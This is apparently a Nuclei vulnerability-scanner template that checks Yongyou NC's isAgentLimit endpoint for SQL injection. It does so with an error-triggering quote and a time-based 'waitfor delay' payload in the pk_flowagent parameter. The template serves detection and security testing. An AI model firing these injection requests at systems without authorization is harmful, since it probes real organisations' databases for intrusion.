id: poc-yaml-yongyou-nc-isagentlimit-sqli
info:
  name: Yongyou NC isAgentLimit SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template identifies an SQL injection vulnerability in the Yongyou NC application on the isAgentLimit endpoint.

variables:
  t1: '{{rand_int(5, 10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1' HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "关键字 'null' 附近有语法错误"

  - raw:
      - |
        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<info>"
          - "xml"
      - type: dsl
        dsl:
          - "duration > to_number(t1) && duration < to_number(t2)"
